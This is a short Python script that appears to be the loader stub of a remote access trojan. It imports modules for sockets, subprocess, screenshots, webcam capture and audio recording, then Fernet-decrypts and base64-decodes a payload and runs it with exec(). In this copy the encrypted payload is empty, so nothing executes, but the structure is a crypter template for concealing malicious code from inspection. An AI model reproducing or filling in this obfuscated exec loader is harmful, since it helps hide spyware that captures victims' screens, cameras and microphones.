
import base64
from cryptography.fernet import Fernet
import socket
import os
import json
import subprocess
import base64
import sys
import pyautogui
import tempfile
import sys
import time
import threading
import cv2
from scipy.io.wavfile import write
import sounddevice
key=Fernet.generate_key()
f=Fernet(key)
token = f.encrypt(b"")
exec(base64.b64decode(f.decrypt(token)))

